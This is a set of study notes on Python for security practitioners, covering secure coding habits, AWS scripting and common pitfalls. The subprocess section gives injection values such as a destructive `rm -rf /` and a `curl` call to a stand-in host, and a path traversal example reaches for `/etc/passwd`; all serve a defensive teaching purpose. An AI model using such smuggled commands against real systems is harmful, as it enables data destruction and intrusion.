%% Deep dives for cards/08_python_security.md. Written for someone strong on security and new to Python.

## Why use a virtual environment?
### What it is
A virtual environment is a private folder of installed packages for one project. You create it with `python3 -m venv .venv` and activate it, and `pip install` then puts packages there instead of system-wide.
### Why this is the answer
Different projects need different versions of libraries, and installing everything globally causes clashes. It is also a security habit: you know exactly which packages a project uses (and can pin them), instead of an unpredictable pile that anything could depend on. It does not speed Python up or encrypt anything.
### Remember it
One project, one set of packages, nothing leaking between them.

## `with open(path) as f:` why?
### What it is
`with` runs a block of code and guarantees cleanup when the block ends, even if an error occurs. For files, the cleanup is closing the file.
### Why this is the answer
Without it, an exception can leave files open, which leaks file handles and can leave data unwritten. The `with` form closes the file for you every time. It does not make the file read-only, encrypt it or load it into memory.
### Remember it
`with` means "clean up for me, no matter what".

## `d["key"]` vs `d.get("key")`
### What it is
Both read a value from a dictionary.
- `d["key"]` raises a `KeyError` if the key is missing.
- `d.get("key")` returns `None` (or a default you give, like `d.get("key", 0)`) instead.
### Why this is the answer
Security data is messy: events often lack fields. Indexing directly can crash your script on the first odd record. `.get` lets you handle missing fields deliberately. Note that silently using a default can also hide problems, so decide what a missing value should mean.
### Remember it
Brackets fail loudly; `.get` is forgiving.

## Write a list comprehension that keeps the even numbers.
### What it is
A list comprehension builds a list in one line: `[expression for item in items if condition]`.
### Why this is the answer
For the even numbers, it is `[n for n in numbers if n % 2 == 0]`. Read it as "give me n, for each n in numbers, if n divided by 2 leaves remainder 0". The wrong forms put `if` or `for` in an order Python does not accept. The same pattern filters log events: `[e for e in events if e["severity"] == "high"]`.
### Remember it
What to keep, for each item, if the test passes.

## What is `if __name__ == "__main__":` for?
### What it is
Every Python file has a built-in name. When you run it directly, the name is `"__main__"`. When another file imports it, the name is the module's name.
### Why this is the answer
The block under the `if` runs only when the file is executed directly. That lets one file be both a script and a set of functions other code can import, without the script part running unexpectedly. It does not mark a package or run on every function call.
### Remember it
"Only run this if I was started directly."

## boto3 client vs resource
### What it is
boto3 is the AWS library for Python.
- A **client** (`boto3.client("s3")`) maps one-to-one to the AWS API and returns dictionaries.
- A **resource** is an object-oriented wrapper, convenient but no longer receiving new features.
### Why this is the answer
Clients cover every API call and are what you see in AWS documentation, so the examples you read translate directly. Prefer clients for new work, especially for security and IR scripts, which call many different APIs.
### Remember it
Client mirrors the API. Resource is a frozen convenience layer.

## Why must you paginate AWS API calls?
### What it is
Many AWS calls return a limited number of results per call, along with a token for the next batch. Collecting everything means calling repeatedly. boto3 provides paginators, for example `client.get_paginator("lookup_events")`.
### Why this is the answer
Skipping pagination returns only the first page and gives no error. In incident response that means an incomplete timeline and possibly a wrong conclusion. boto3 does not merge pages automatically.
### Remember it
If you do not loop through pages, you silently miss data.

## How do you catch a specific AWS error?
### What it is
boto3 raises `botocore.exceptions.ClientError` when AWS returns an error. The specific error is in `e.response["Error"]["Code"]`, such as `AccessDenied` or `NoSuchBucket`.
### Why this is the answer
Catching `ClientError` and checking the code lets you respond differently to different problems (for example, skip a bucket you cannot read but fail on something unexpected). Using invented exception names or catching everything hides what really happened.
### Remember it
Catch ClientError, then read the error code.

## Why is a bare `except:` a problem?
### What it is
A bare `except:` catches every exception, including ones you did not anticipate and even Ctrl-C.
### Why this is the answer
It hides bugs and failures, so your script may carry on as if everything worked. In security tooling, silently skipping an error can mean silently skipping evidence. Catch the specific exceptions you expect and let the rest surface.
### Remember it
Catch what you expect; let surprises be loud.

## `subprocess.run(["ls", path])` vs `subprocess.run(f"ls {path}", shell=True)`
### What it is
`subprocess` runs other programs.
- With a **list**, each item is passed directly as an argument.
- With `shell=True` and a **string**, the whole string is interpreted by a shell.
### Why this is the answer
If `path` contains `; rm -rf /` or `$(curl evil)`, the shell version runs it: command injection. The list version treats it as just a strange filename. Prefer lists and avoid `shell=True` with any input you do not fully control.
### Remember it
Lists pass data. Shell strings run commands.

## Which functions are dangerous on untrusted input?
### What it is
- `eval` and `exec` run text as Python code.
- `pickle.load` can run code while rebuilding an object.
- `yaml.load` (without a safe loader) can construct arbitrary objects.
### Why this is the answer
All of them let the data decide what code runs. For untrusted input use data-only parsers: `json.loads` and `yaml.safe_load`. Functions like `len`, `sum` or `print` are harmless.
### Remember it
If it can turn data into code, don't point it at strangers' data.

## How do you avoid SQL injection in Python?
### What it is
Use **parameterized queries**: the query text has placeholders, and values are passed separately, for example `cur.execute("SELECT * FROM users WHERE id = ?", (user_id,))`.
### Why this is the answer
The database treats the value strictly as data, so quotes or SQL fragments in it cannot change the query. Building the query with f-strings, concatenation or regex cleaning leaves gaps.
### Remember it
Placeholders, never string-building.

## `random` vs `secrets`
### What it is
`random` is a pseudo-random generator meant for simulations and games, and its output can be predicted. `secrets` draws from the operating system's secure source.
### Why this is the answer
Anything an attacker must not guess, such as tokens, passwords or keys, needs `secrets` (for example `secrets.token_urlsafe(32)`). Using `random` for those makes them guessable.
### Remember it
random for games, secrets for secrets.

## Where do API keys and webhook URLs belong?
### What it is
In environment variables or a secrets manager, read at runtime, never written into source code.
### Why this is the answer
Code gets committed, shared and logged. A secret in it will leak. A Slack webhook URL counts as a secret too, because anyone with it can post as you. Keep them out of public config files and comments.
### Remember it
Secrets live outside the code.

## Why does `requests.get(url)` need `timeout=`?
### What it is
By default, the `requests` library waits **forever** for a response.
### Why this is the answer
A slow or stalled server can hang your script indefinitely, which is a problem for automation and for response tooling. Pass `timeout=10` (seconds) so a failure is reported instead of a freeze. The default is not 1 or 30 seconds, and it applies to HTTP as well as HTTPS.
### Remember it
No timeout means it may wait forever.

## `logging` vs `print`
### What it is
`logging` has levels (debug, info, warning, error), formats, and handlers that send messages to files or collectors. `print` just writes text to the screen.
### Why this is the answer
For anything you run repeatedly or in automation, logging gives timestamps, severity and the ability to route and filter messages. Whatever you use, never log secrets or tokens, because logs are widely read and stored.
### Remember it
Use logging for tools; never log secrets.

## `json.loads` vs `json.dumps`
### What it is
- `json.loads(text)` turns a JSON **string** into Python objects (the "s" stands for string).
- `json.dumps(obj)` turns Python objects into a JSON **string**.
### Why this is the answer
You use `loads` to read an event or API response and `dumps` to produce JSON to send or save. They are opposites, and mixing them up is a common beginner error. File versions are `json.load` and `json.dump`.
### Remember it
loads = string to object. dumps = object to string.

## Why use timezone-aware datetimes?
### What it is
A naive datetime has no timezone attached. An aware one does, such as `datetime.now(timezone.utc)`.
### Why this is the answer
Logs and incidents span timezones and daylight-saving changes. Comparing naive times can silently put events in the wrong order, which corrupts a timeline. Use UTC internally and convert only for display.
### Remember it
Timelines are in UTC.

## How do you stop path traversal when joining user input to a directory?
### What it is
Path traversal is input like `../../etc/passwd` escaping the folder you meant to restrict access to.
### Why this is the answer
Strip-based fixes miss encodings and tricks. A reliable approach is to **resolve** the final path (turn it into an absolute path with links and `..` collapsed) and check it is still inside the base directory, for example with `Path.resolve()` and `is_relative_to`.
### Remember it
Resolve first, then verify it is still inside the allowed folder.

## Mutable default argument trap
### What it is
In `def f(items=[])`, the default list is created **once**, when the function is defined, not on each call.
### Why this is the answer
Every call that uses the default shares the same list, so data from earlier calls appears in later ones. In a tool processing events, that can leak one record into another. The fix is `def f(items=None):` and then `items = [] if items is None else items`.
### Remember it
Defaults are made once. Use None and build inside.

## What does `yield` do and why is it useful for logs?
### What it is
A function with `yield` becomes a **generator**: it hands back one item at a time and pauses until asked for the next.
### Why this is the answer
Log files can be huge. A generator lets you process them line by line without loading everything into memory. It does not return a full list or stop the program.
### Remember it
One item at a time, memory stays small.

## Shape of an AWS Lambda handler in Python
### What it is
`def handler(event, context):`. Lambda calls this function with `event` (the input data, such as an EventBridge finding) and `context` (runtime information).
### Why this is the answer
The two parameters are required by the Lambda interface, whatever you name the function in configuration. Give the function a least-privilege execution role and a sensible timeout.
### Remember it
event in, context alongside, result out.

## Minimal pytest test
### What it is
A function whose name starts with `test_`, in a file named `test_*.py`, that uses a plain `assert`. Run it with `pytest`.
### Why this is the answer
pytest finds tests by naming convention and reports failed asserts with detail. You do not need a special class or print statements. Tests let you change security tooling without fear of silently breaking it.
### Remember it
test_ name, plain assert.

## Type hints: do they enforce anything at runtime?
### What it is
Type hints, like `def f(x: int) -> str:`, annotate what types you intend.
### Why this is the answer
Python ignores them when running. They help readers and tools such as mypy and your editor catch mistakes before you run the code. Passing the wrong type does not raise an error just because of the hint.
### Remember it
Hints are documentation that tools can check.

## How do you check your dependencies for known vulnerabilities?
### What it is
`pip-audit` compares your installed or listed packages with known vulnerability databases. Pinning versions makes the result reproducible.
### Why this is the answer
Your project is only as safe as its dependencies. `pip freeze` lists packages but does not check them, `venv` creates an environment, and `pip check` only tests compatibility.
### Remember it
Pin them, then audit them.

## What does `enumerate(items)` give you?
### What it is
`enumerate` wraps a list and yields `(index, item)` pairs: `for i, event in enumerate(events):`.
### Why this is the answer
It gives you a counter without managing it yourself. It does not sort, copy or reverse the list. It is handy for reporting which record caused a problem.
### Remember it
Index and item together.

## How do you read an environment variable safely?
### What it is
`os.environ.get("NAME")` returns `None` if the variable is unset. `os.environ["NAME"]` raises a `KeyError`.
### Why this is the answer
Handle the missing case on purpose: stop with a clear message if a required secret is not set, instead of crashing mysteriously or continuing with an empty value. Do not read secrets from files committed to the repo.
### Remember it
Use `.get` and decide what a missing value means.

## What does `sorted(d.items(), key=lambda kv: kv[1], reverse=True)` do?
### What it is
`d.items()` gives (key, value) pairs. `sorted` orders them, `key=lambda kv: kv[1]` says to sort by the value (item 1 of each pair), and `reverse=True` puts the largest first.
### Why this is the answer
It produces a "top N" list, such as the IPs with the most requests. Sorting by key would use `kv[0]`, and `sorted` does not change the dictionary in place.
### Remember it
`kv[1]` is the value; `reverse=True` is biggest first.

## What is `collections.Counter` good for?
### What it is
`Counter` counts how many times each item appears: `Counter(ips).most_common(5)`.
### Why this is the answer
Counting is constant in security work: events per user, requests per IP, failures per account. `Counter` does it in one line and `most_common` gives the top results.
### Remember it
Count things, then ask for the top few.

## What does `try/finally` guarantee?
### What it is
The code in `finally` runs whether the `try` block succeeded or raised an exception.
### Why this is the answer
It is where cleanup belongs: closing connections, removing temporary files, releasing locks. The error still propagates unless you also catch it.
### Remember it
`finally` always runs.

## How do you build a file path safely?
### What it is
Use `pathlib`: `Path(base) / name`.
### Why this is the answer
Joining strings by hand gets separators wrong across operating systems and invites mistakes that lead to traversal bugs. `Path` handles separators and gives methods like `resolve()`. Never build paths by passing input through a shell.
### Remember it
Use Path and the `/` operator.

## What is a dataclass for?
### What it is
A `@dataclass` is a class mainly for storing fields. Python generates `__init__`, `__repr__` and comparisons for you.
### Why this is the answer
It gives a clear structure to things like a parsed alert (`user`, `ip`, `time`) with little code, and typos in field names get caught. It does not encrypt, restrict subclassing or define a database table.
### Remember it
A tidy container for related fields.

## How do you parse a CloudTrail timestamp like `2026-10-05T14:03:11Z`?
### What it is
`datetime.fromisoformat(s.replace("Z", "+00:00"))` gives a timezone-aware UTC datetime.
### Why this is the answer
The `Z` means UTC. Replacing it with `+00:00` makes the string acceptable to `fromisoformat` on all recent Python versions, and the result is timezone-aware, which keeps timelines correct. Converting with `int` or splitting only the date throws away information.
### Remember it
Z means UTC; swap it for +00:00 and parse.

## What do `argparse` and `typer` do?
### What it is
They turn command-line arguments into values your program can use, with validation and automatic `--help`.
### Why this is the answer
Instead of reading `sys.argv` yourself, you declare the options and the library handles parsing, errors and documentation. They do not parse web pages or install packages.
### Remember it
Command-line options made easy.

## What are context managers (`with`) good for beyond files?
### What it is
Any resource that needs setup and cleanup: locks, database connections, temporary directories, network sessions.
### Why this is the answer
The `with` statement guarantees the cleanup step runs even on errors. That prevents leaks such as unclosed connections or leftover temp files, which in security tooling can leave sensitive data on disk.
### Remember it
Setup and guaranteed cleanup for anything that needs it.

## Why avoid `except Exception: pass`?
### What it is
It catches almost any error and then does nothing.
### Why this is the answer
Failures vanish. A script that skips a record because of a bug, or fails an API call, looks like it succeeded. In IR tooling that means missing evidence without knowing. At minimum, log the error, and catch only what you can handle.
### Remember it
Silent failure is the worst kind.

## How do you read a field from nested JSON safely?
### What it is
Events are often nested dictionaries. Use `.get()` chains, like `event.get("userIdentity", {}).get("arn")`, or a small helper that returns a default.
### Why this is the answer
Direct indexing crashes on the first event missing a field, and wrapping everything in a bare `except` hides real errors. Defensive access lets your script process messy real-world data and treat missing values deliberately.
### Remember it
Missing keys are normal; don't let them crash you.
